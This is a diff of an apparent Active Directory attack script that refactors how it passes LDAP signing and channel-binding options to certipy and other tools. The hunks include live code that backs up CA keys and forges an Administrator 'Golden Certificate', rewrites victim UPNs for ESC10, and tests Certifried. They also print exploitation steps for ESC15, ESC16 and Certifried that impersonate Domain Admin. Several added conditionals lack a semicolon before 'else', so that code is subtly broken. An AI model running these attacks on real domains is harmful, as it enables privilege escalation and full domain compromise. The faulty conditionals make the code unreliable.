-            echo -e "${certipy} req ${argument_certipy} -target [ ${pki_servers} ] -ca [ \"${pki_cas//SPACE/ }\" ] -template ${vulntemp} -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapbindsign_param}"
+            echo -e "${certipy} req ${argument_certipy} -target [ ${pki_servers} ] -ca [ \"${pki_cas//SPACE/ }\" ] -template ${vulntemp} -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
             echo -e "${CYAN}2. Authenticate with the obtained certificate to get a TGT:${NC}"
             echo -e "${certipy} auth -pfx ${user}.pfx -dc-ip ${dc_ip} ${ldaps_param}"
             echo -e "${CYAN}3. Use the obtained TGT to perform privileged actions:${NC}"
@@ -2126,11 +2146,11 @@ adcs_vuln_parse() {
         for vulntemp in $esc15_vuln; do
             echo -e "\n${BLUE}# ${vulntemp} certificate template${NC}"
             echo -e "${CYAN}1. Request a certificate injecting 'Client Authentication' Application Policy:${NC}"
-            echo -e "${certipy} req ${argument_certipy} -target [ ${pki_servers} ] -ca [ \"${pki_cas//SPACE/ }\" ] -template ${vulntemp} -application-policies 'Client Authentication' -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapbindsign_param}"
+            echo -e "${certipy} req ${argument_certipy} -target [ ${pki_servers} ] -ca [ \"${pki_cas//SPACE/ }\" ] -template ${vulntemp} -application-policies 'Client Authentication' -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
             echo -e "_OR_"
             echo -e "${CYAN}1. Request a certificate, injecting 'Certificate Request Agent' Application Policy, then using the 'Agent' certificate:${NC}"
-            echo -e "${certipy} req ${argument_certipy} -target [ ${pki_servers} ] -ca [ \"${pki_cas//SPACE/ }\" ] -template ${vulntemp} -upn [ Domain Admin ]@${dc_domain} -sid '${sid_domain}-500' -application-policies 'Certificate Request Agent' -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapbindsign_param}"
-            echo -e "${certipy} req ${argument_certipy} -target [ ${pki_servers} ] -ca [ \"${pki_cas//SPACE/ }\" ] -template User -on-behalf-of $(echo "$dc_domain" | cut -d "." -f 1)\\[ Domain Admin ] -pfx '${user}.pfx' -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapbindsign_param}"
+            echo -e "${certipy} req ${argument_certipy} -target [ ${pki_servers} ] -ca [ \"${pki_cas//SPACE/ }\" ] -template ${vulntemp} -upn [ Domain Admin ]@${dc_domain} -sid '${sid_domain}-500' -application-policies 'Certificate Request Agent' -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
+            echo -e "${certipy} req ${argument_certipy} -target [ ${pki_servers} ] -ca [ \"${pki_cas//SPACE/ }\" ] -template User -on-behalf-of $(echo "$dc_domain" | cut -d "." -f 1)\\[ Domain Admin ] -pfx '${user}.pfx' -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
             echo -e "${CYAN}6. Authenticate using pfx of Domain Admin:${NC}"
             echo -e "${certipy} auth -pfx [ Domain Admin ].pfx -dc-ip ${dc_ip} ${ldaps_param}"
         done
@@ -2142,13 +2162,13 @@ adcs_vuln_parse() {
         for vulnca in $esc16_vuln; do
             echo -e "\n${BLUE}# \"${vulnca//SPACE/ }\" certificate authority${NC}"
             echo -e "${CYAN}1. Update the victim account's UPN to the target administrator's sAMAccountName:${NC}"
-            echo -e "${certipy} account update ${argument_certipy} -dc-ip ${dc_ip} -user [ Victim ] -upn [ Domain Admin ]@${dc_domain} ${ldaps_param} ${ldapbindsign_param}"
+            echo -e "${certipy} account update ${argument_certipy} -dc-ip ${dc_ip} -user [ Victim ] -upn [ Domain Admin ]@${dc_domain} ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
             echo -e "${CYAN}2. Retrieve credentials of the victim account using Shadow Credentials:${NC}"
-            echo -e "${certipy} shadow auto ${argument_certipy} -dc-ip ${dc_ip} -account [ Victim ] ${ldaps_param} ${ldapbindsign_param}"
+            echo -e "${certipy} shadow auto ${argument_certipy} -dc-ip ${dc_ip} -account [ Victim ] ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
             echo -e "${CYAN}3. Request a certificate as the Victim user from any suitable 'Client Authentication' template:${NC}"
-            echo -e "${certipy} req ${argument_certipy} -k -target [ ${pki_servers} ] -ca \"${vulnca//SPACE/ }\" -template User -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapbindsign_param}"
+            echo -e "${certipy} req ${argument_certipy} -k -target [ ${pki_servers} ] -ca \"${vulnca//SPACE/ }\" -template User -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
             echo -e "${CYAN}4. Revert the victim account's UPN:${NC}"
-            echo -e "${certipy} account update ${argument_certipy} -dc-ip ${dc_ip} -user [ Victim ] -upn [ Victim ]@${dc_domain} ${ldaps_param} ${ldapbindsign_param}"
+            echo -e "${certipy} account update ${argument_certipy} -dc-ip ${dc_ip} -user [ Victim ] -upn [ Victim ]@${dc_domain} ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
             echo -e "${CYAN}6. Authenticate using pfx of Domain Admin:${NC}"
             echo -e "${certipy} auth -pfx [ Domain Admin ].pfx -dc-ip ${dc_ip} ${ldaps_param}"
         done
@@ -2171,25 +2191,21 @@ certifried_check() {
                 for pki_server in $pki_servers; do
                     i=$((i + 1))
                     pki_ca=$(echo -e "$pki_cas" | sed 's/ /\n/g' | sed -n ${i}p)
-                    if [ "${ldaps_bool}" == true ]; then
-                        ldaps_param=""
-                        if [ "${ldapbindsign_bool}" == true ]; then ldapbindsign_param=""; else ldapbindsign_param="-no-ldap-channel-binding"; fi
-                    else
-                        ldaps_param="-ldap-scheme ldap"
-                        if [ "${ldapbindsign_bool}" == true ]; then ldapbindsign_param=""; else ldapbindsign_param="-no-ldap-signing"; fi
-                    fi
+                    if [ "${ldaps_bool}" == true ]; then ldaps_param="" else ldaps_param="-ldap-scheme ldap"; fi
+                    if [ "${ldapsign_bool}" == true ]; then ldapsign_param=""; else ldapsign_param="-no-ldap-signing"; fi
+                    if [ "${ldapbind_bool}" == true ]; then ldapbind_param=""; else ldapbind_param="-no-ldap-channel-binding"; fi
                     if [ "${dnstcp_bool}" == true ]; then dnstcp_param="-dns-tcp "; else dnstcp_param=""; fi
-                    run_command "${certipy} req ${argument_certipy} -dc-ip ${dc_ip} -ns ${dns_ip} ${dnstcp_param} ${ldaps_param} ${ldapbindsign_param} -target ${pki_server} -ca \"${pki_ca//SPACE/ }\" -template User -key-size 4096" 2>&1 | tee "${ADCS_dir}/certifried_check_${pki_server}_${user_var}.txt"
+                    run_command "${certipy} req ${argument_certipy} -dc-ip ${dc_ip} -ns ${dns_ip} ${dnstcp_param} ${ldaps_param} ${ldapsign_param} ${ldapbind_param} -target ${pki_server} -ca \"${pki_ca//SPACE/ }\" -template User -key-size 4096" 2>&1 | tee "${ADCS_dir}/certifried_check_${pki_server}_${user_var}.txt"
                     if ! grep -q "Certificate object SID is" "${ADCS_dir}/certifried_check_${pki_server}_${user_var}.txt" && ! grep -q "error" "${ADCS_dir}/certifried_check_${pki_server}_${user_var}.txt"; then
                         echo -e "${GREEN}[+] ${pki_server} potentially vulnerable to Certifried! Follow steps below for exploitation:${NC}" | tee -a "${ADCS_dir}/Certifried_exploitation_steps_${dc_domain}.txt"
                         echo -e "${CYAN}1. Create a new computer account with a dNSHostName property of a Domain Controller:${NC}" | tee -a "${ADCS_dir}/Certifried_exploitation_steps_${dc_domain}.txt"
-                        echo -e "${certipy} account create ${argument_certipy} -user NEW_COMPUTER_NAME -pass NEW_COMPUTER_PASS -dc-ip $dc_ip -dns $dc_NETBIOS.$dc_domain ${ldaps_param} ${ldapbindsign_param}" | tee -a "${ADCS_dir}/Certifried_exploitation_steps_${dc_domain}.txt"
+                        echo -e "${certipy} account create ${argument_certipy} -user NEW_COMPUTER_NAME -pass NEW_COMPUTER_PASS -dc-ip $dc_ip -dns $dc_NETBIOS.$dc_domain ${ldaps_param} ${ldapsign_param} ${ldapbind_param}" | tee -a "${ADCS_dir}/Certifried_exploitation_steps_${dc_domain}.txt"
                         echo -e "${CYAN}2. Obtain a certificate for the new computer:${NC}" | tee -a "${ADCS_dir}/Certifried_exploitation_steps_${dc_domain}.txt"
-                        echo -e "${certipy} req -u NEW_COMPUTER_NAME\$@${dc_domain} -p NEW_COMPUTER_PASS -dc-ip $dc_ip -target $pki_server -ca \"${pki_ca//SPACE/ }\" -template Machine -key-size 4096 ${ldaps_param} ${ldapbindsign_param}" | tee -a "${ADCS_dir}/Certifried_exploitation_steps_${dc_domain}.txt"
+                        echo -e "${certipy} req -u NEW_COMPUTER_NAME\$@${dc_domain} -p NEW_COMPUTER_PASS -dc-ip $dc_ip -target $pki_server -ca \"${pki_ca//SPACE/ }\" -template Machine -key-size 4096 ${ldaps_param} ${ldapsign_param} ${ldapbind_param}" | tee -a "${ADCS_dir}/Certifried_exploitation_steps_${dc_domain}.txt"
                         echo -e "${CYAN}3. Authenticate using pfx:${NC}" | tee -a "${ADCS_dir}/Certifried_exploitation_steps_${dc_domain}.txt"
                         echo -e "${certipy} auth -pfx ${dc_NETBIOS}$.pfx -username ${dc_NETBIOS}\$ -dc-ip ${dc_ip} ${ldaps_param}" | tee -a "${ADCS_dir}/Certifried_exploitation_steps_${dc_domain}.txt"
                         echo -e "${CYAN}4. Delete the created computer:${NC}" | tee -a "${ADCS_dir}/Certifried_exploitation_steps_${dc_domain}.txt"
-                        echo -e "${certipy} account delete ${argument_certipy} -dc-ip ${dc_ip} -user NEW_COMPUTER_NAME ${ldaps_param} ${ldapbindsign_param}" | tee -a "${ADCS_dir}/Certifried_exploitation_steps_${dc_domain}.txt"
+                        echo -e "${certipy} account delete ${argument_certipy} -dc-ip ${dc_ip} -user NEW_COMPUTER_NAME ${ldaps_param} ${ldapsign_param} ${ldapbind_param}" | tee -a "${ADCS_dir}/Certifried_exploitation_steps_${dc_domain}.txt"
                     fi
                 done
                 cd "${current_dir}" || exit
@@ -2229,19 +2245,15 @@ certipy_ca_dump() {
             domain_DN=$(fqdn_to_ldap_dn "${dc_domain}")
             current_dir=$(pwd)
             cd "${Credentials_dir}" || exit
-            if [ "${ldaps_bool}" == true ]; then
-                ldaps_param=""
-                if [ "${ldapbindsign_bool}" == true ]; then ldapbindsign_param=""; else ldapbindsign_param="-no-ldap-channel-binding"; fi
-            else
-                ldaps_param="-ldap-scheme ldap"
-                if [ "${ldapbindsign_bool}" == true ]; then ldapbindsign_param=""; else ldapbindsign_param="-no-ldap-signing"; fi
-            fi
+            if [ "${ldaps_bool}" == true ]; then ldaps_param="" else ldaps_param="-ldap-scheme ldap"; fi
+            if [ "${ldapsign_bool}" == true ]; then ldapsign_param=""; else ldapsign_param="-no-ldap-signing"; fi
+            if [ "${ldapbind_bool}" == true ]; then ldapbind_param=""; else ldapbind_param="-no-ldap-channel-binding"; fi
             i=0
             for pki_server in $pki_servers; do
                 i=$((i + 1))
                 pki_ca=$(echo -e "$pki_cas" | sed 's/ /\n/g' | sed -n ${i}p)
                 if [ "${dnstcp_bool}" == true ]; then dnstcp_param="-dns-tcp "; else dnstcp_param=""; fi
-                run_command "${certipy} ca ${argument_certipy} -dc-ip ${dc_ip} -ns ${dns_ip} ${dnstcp_param} -target ${pki_server} -backup ${ldaps_param} ${ldapbindsign_param}" | tee -a "${ADCS_dir}/certipy_ca_backup_output_${user_var}.txt"
+                run_command "${certipy} ca ${argument_certipy} -dc-ip ${dc_ip} -ns ${dns_ip} ${dnstcp_param} -target ${pki_server} -backup ${ldaps_param} ${ldapsign_param} ${ldapbind_param}" | tee -a "${ADCS_dir}/certipy_ca_backup_output_${user_var}.txt"
                 run_command "${certipy} forge -ca-pfx ${Credentials_dir}/${pki_ca//SPACE/_}.pfx -upn Administrator@${dc_domain} -subject CN=Administrator,CN=Users,$domain_DN -out Administrator_${pki_ca//SPACE/_}_${dc_domain}.pfx" | tee -a "${ADCS_dir}/certipy_forge_output_${user_var}.txt"
                 if stat "${Credentials_dir}/Administrator_${pki_ca//SPACE/_}_${dc_domain}.pfx" >/dev/null 2>&1; then
                     echo -e "${GREEN}[+] Golden Certificate successfully generated!${NC}"
@@ -2616,8 +2628,8 @@ pre2k_check() {
                 run_command "${pre2k} unauth ${argument_pre2k} -dc-ip ${dc_ip} -inputfile ${servers_hostname_list} -outputfile ${pre2k_outputfile}" | tee "${BruteForce_dir}/pre2k_output_${dc_domain}.txt"
             fi
         else
-            if [ "${ldapbindsign_bool}" == true ]; then ldapbindsign_param="-binding"; else ldapbindsign_param=""; fi
-            if [ "${ldaps_bool}" == true ]; then ldaps_param="-ldaps ${ldapbindsign_param}"; else ldaps_param=""; fi
+            if [ "${ldapbind_bool}" == true ]; then ldapbind_param="-binding"; else ldapbind_param=""; fi
+            if [ "${ldaps_bool}" == true ]; then ldaps_param="-ldaps ${ldapbind_param}"; else ldaps_param=""; fi
             run_command "${pre2k} auth ${argument_pre2k} -dc-ip ${dc_ip} -outputfile ${pre2k_outputfile} ${ldaps_param}" | tee "${BruteForce_dir}/pre2k_output_${dc_domain}.txt"
         fi
     fi
@@ -4138,7 +4150,6 @@ add_upn_esc10() {
         if [ "${nullsess_bool}" == true ]; then
             echo -e "${PURPLE}[-] certipy requires credentials${NC}"
         else
-            if [ "${ldaps_bool}" == true ]; then ldaps_param=""; else ldaps_param="-ldap-scheme ldap"; fi
             if [ "${dnstcp_bool}" == true ]; then dnstcp_param="-dns-tcp "; else dnstcp_param=""; fi
             echo -e "\n${YELLOW}[!] Manually check for ESC10 vulnerability by querying the registry:${NC}"
             echo -e "reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL"
@@ -4173,17 +4184,20 @@ add_upn_esc10() {
                     echo -e "${RED}Invalid name.${NC} Please specify value of upn:"
                     read -rp ">> " value_upn </dev/tty
                 done
-                run_command "${certipy} account update ${argument_certipy} -user ${target_upn} -upn '${value_upn}'@${dc_domain} -dc-ip ${dc_ip} ${ldaps_param} ${ldapbindsign_param}" | tee -a "${Modification_dir}/certipy_esc10_out_${user_var}.txt"
+                if [ "${ldaps_bool}" == true ]; then ldaps_param=""; else ldaps_param="-ldap-scheme ldap"; fi
+                if [ "${ldapsign_bool}" == true ]; then ldapsign_param=""; else ldapsign_param="-no-ldap-signing"; fi
+                if [ "${ldapbind_bool}" == true ]; then ldapbind_param=""; else ldapbind_param="-no-ldap-channel-binding"; fi
+                run_command "${certipy} account update ${argument_certipy} -user ${target_upn} -upn '${value_upn}'@${dc_domain} -dc-ip ${dc_ip} ${ldaps_param} ${ldapsign_param} ${ldapbind_param}" | tee -a "${Modification_dir}/certipy_esc10_out_${user_var}.txt"
                 echo -e "${BLUE}[*] Requesting certificate permitting client authentication for ${target_upn}.${NC}"
                 pki_server=$(echo -e "$pki_servers" | sed 's/ /\n/g' | sed -n ${1}p)
                 pki_ca=$(echo -e "$pki_cas" | sed 's/ /\n/g' | sed -n ${1}p)
                 current_dir=$(pwd)
                 cd "${Credentials_dir}" || exit
                 if [ "${kerb_bool}" == true ]; then krb_upn="KRB5CCNAME=''"; krb_param="-k"; else krb_upn=""; krb_param=""; fi
-                run_command "${krb_upn} ${certipy} req -u ${target_upn}@${dc_domain} -hashes ${target_upn_hash} ${krb_param} -dc-ip ${dc_ip} -ns ${dc_ip} ${dnstcp_param} -target ${pki_server} -ca \"${pki_ca//SPACE/ }\" -template User -key-size 4096 ${ldaps_param} ${ldapbindsign_param}" | tee -a "${Modification_dir}/certipy_esc10_out_${user_var}.txt"
+                run_command "${krb_upn} ${certipy} req -u ${target_upn}@${dc_domain} -hashes ${target_upn_hash} ${krb_param} -dc-ip ${dc_ip} -ns ${dc_ip} ${dnstcp_param} -target ${pki_server} -ca \"${pki_ca//SPACE/ }\" -template User -key-size 4096 ${ldaps_param} ${ldapsign_param}  ${ldapbind_param}" | tee -a "${Modification_dir}/certipy_esc10_out_${user_var}.txt"
                 cd "${current_dir}" || exit
                 echo -e "${BLUE}[*] Modifying userPrincipalName of ${target_upn} back to original value.${NC}"
-                run_command "${certipy} account update ${argument_certipy} -user ${target_upn} -upn ${target_upn}@${dc_domain} -dc-ip ${dc_ip} ${ldaps_param} ${ldapbindsign_param}" | tee -a "${Modification_dir}/certipy_esc10_out_${user_var}.txt"
+                run_command "${certipy} account update ${argument_certipy} -user ${target_upn} -upn ${target_upn}@${dc_domain} -dc-ip ${dc_ip} ${ldaps_param} ${ldapsign_param} ${ldapbind_param}" | tee -a "${Modification_dir}/certipy_esc10_out_${user_var}.txt"
                 if stat "${Credentials_dir}/${value_upn//\$/}.pfx" >/dev/null 2>&1; then
                     echo -e "\n${GREEN}[+] Authenticate using pfx of impersonated Admin or DC:${NC}"
                     echo -e "${certipy} auth -pfx ${Credentials_dir}/${value_upn//\$/}.pfx -dc-ip ${dc_ip} ${ldaps_param} [-ldap-shell]"
@@ -4865,7 +4879,10 @@ print_info() {
     echo -e "${YELLOW}[i]${NC} Attacker's IP and Interface: ${YELLOW}${attacker_IP}${NC} (${YELLOW}${attacker_interface}${NC})"
     echo -e "${YELLOW}[i]${NC} List of servers: ${YELLOW}${servers_hostname_list}${NC}"
     echo -e "${YELLOW}[i]${NC} List of users: ${YELLOW}${users_list}${NC}"
-    echo -e "${YELLOW}[i]${NC} Parameters: LDAPPort=${YELLOW}${ldap_port}${NC}, LDAPS=${YELLOW}${ldaps_bool}${NC}, LDAPSign=${YELLOW}${ldapbindsign_bool}${NC}, ForceKerb=${YELLOW}${forcekerb_bool}${NC}, DNSTCP=${YELLOW}${dnstcp_bool}${NC}, UseIP=${YELLOW}${useip_bool}${NC}"
+    if [ "${ldapsign_bool}" == true ]; then ldap_sign_status="${RED}Enforced${NC}"; else ldap_sign_status="${GREEN}Not Enforced${NC}"; fi
+    if [ "${ldapbind_bool}" == true ]; then ldap_bind_status="${RED}Enforced${NC}"; else ldap_bind_status="${GREEN}Not Enforced${NC}"; fi
+    echo -e "${YELLOW}[i]${NC} Parameters: LDAPPort=${YELLOW}${ldap_port}${NC}, LDAPS=${YELLOW}${ldaps_bool}${NC}, LDAPSign=${YELLOW}${ldapsign_bool}${NC}, LDAPBind=${YELLOW}${ldapbind_bool}${NC}, ForceKerb=${YELLOW}${forcekerb_bool}${NC}, DNSTCP=${YELLOW}${dnstcp_bool}${NC}, UseIP=${YELLOW}${useip_bool}${NC}"
+    echo -e "${YELLOW}[i]${NC} LDAP Security: Signing=${ldap_sign_status}, ChannelBinding=${ldap_bind_status}"
     echo -e "${YELLOW}[i]${NC} Current target(s): ${YELLOW} ${curr_targets}${custom_servers}${custom_ip}${NC} - Number of server(s): ${YELLOW}$(wc -l < "${curr_targets_list}")${NC}"
 }
 
@@ -7004,15 +7021,11 @@ auth_menu() {
                     for pki_server in $pki_servers; do
                         i=$((i + 1))
                         pki_ca=$(echo -e "$pki_cas" | sed 's/ /\n/g' | sed -n ${i}p)
-                        if [ "${ldaps_bool}" == true ]; then
-                            ldaps_param=""
-                            if [ "${ldapbindsign_bool}" == true ]; then ldapbindsign_param=""; else ldapbindsign_param="-no-ldap-channel-binding"; fi
-                        else
-                            ldaps_param="-ldap-scheme ldap"
-                            if [ "${ldapbindsign_bool}" == true ]; then ldapbindsign_param=""; else ldapbindsign_param="-no-ldap-signing"; fi
-                        fi
+                    if [ "${ldaps_bool}" == true ]; then ldaps_param="" else ldaps_param="-ldap-scheme ldap"; fi
+                    if [ "${ldapsign_bool}" == true ]; then ldapsign_param=""; else ldapsign_param="-no-ldap-signing"; fi
+                    if [ "${ldapbind_bool}" == true ]; then ldapbind_param=""; else ldapbind_param="-no-ldap-channel-binding"; fi
                         if [ "${dnstcp_bool}" == true ]; then dnstcp_param="-dns-tcp "; else dnstcp_param=""; fi
-                        run_command "${certipy} req ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} ${dnstcp_param} -target ${pki_server} -ca \"${pki_ca//SPACE/ }\" -template User -key-size 4096 ${ldaps_param} ${ldapbindsign_param}" | tee "${Credentials_dir}/certipy_reqcert_output_${user_var}.txt"
+                        run_command "${certipy} req ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} ${dnstcp_param} -target ${pki_server} -ca \"${pki_ca//SPACE/ }\" -template User -key-size 4096 ${ldaps_param} ${ldapsign_param} ${ldapbind_param}" | tee "${Credentials_dir}/certipy_reqcert_output_${user_var}.txt"
                     done
                     cd "${current_dir}" || exit
                 else
@@ -7272,7 +7285,7 @@ main_menu() {
     echo -e "-----------------------------------------------------"
     echo -e "A) Authentication Menu"
     echo -e "C) Configuration Menu"
-    echo -e "1) Run DNS Enumeration using adidnsdump"
+    echo -e "1) Run DNS Enumeration using netexec"
     echo -e "2) Active Directory Enumeration Menu"
     echo -e "3) ADCS Enumeration Menu"
     echo -e "4) SCCM Enumeration Menu"
